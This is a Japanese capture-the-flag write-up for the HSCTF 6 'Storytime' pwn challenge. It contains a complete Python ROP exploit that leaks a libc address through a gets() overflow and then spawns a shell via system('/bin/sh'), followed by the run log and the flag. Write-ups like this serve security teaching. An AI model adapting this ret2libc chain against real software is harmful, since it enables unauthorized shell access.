# [pwn 333pts] Storytime - HSCTF 6
64ビットです。
```
$ checksec -f storytime
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols     No	0		2	storytime
```

getsによるオーバーフローがあるのでlibc leakして`system("/bin/sh")`できます。
何か使われてない関数がいくつかありましたが、あれを使ってほしかったのかはよく分かりません。

```python
from ptrlib import *

elf = ELF("./storytime")
#sock = Process("./storytime")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
sock = Socket("pwn.hsctf.com", 3333)

plt_write = 0x4004a0
rop_pop_rdi = 0x00400703
rop_pop_rsi_r15 = 0x00400701

payload = b'A' * 0x38
payload += p64(rop_pop_rsi_r15)
payload += p64(elf.got("read"))
payload += p64(0)
payload += p64(rop_pop_rdi)
payload += p64(1)
payload += p64(plt_write)
payload += p64(elf.symbol("_start"))
sock.recvuntil("story: \n")
sock.sendline(payload)
addr_read = u64(sock.recv(8))
logger.info("read = " + hex(addr_read))
libc_base = addr_read - libc.symbol("read")
logger.info("libc base = " + hex(libc_base))

payload = b'A' * 0x38
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.recvuntil("story: \n")
sock.sendline(payload)

sock.interactive()
```

```
$ python solve.py 
[+] __init__: Successfully connected to pwn.hsctf.com:3333
[+] <module>: read = 0x7fe430e30250
[+] <module>: libc base = 0x7fe430d39000
[ptrlib]$ cat flag
[ptrlib]$ hsctf{th4nk7_f0r_th3_g00d_st0ry_yay-314879357}
```

# 感想
簡単ですね。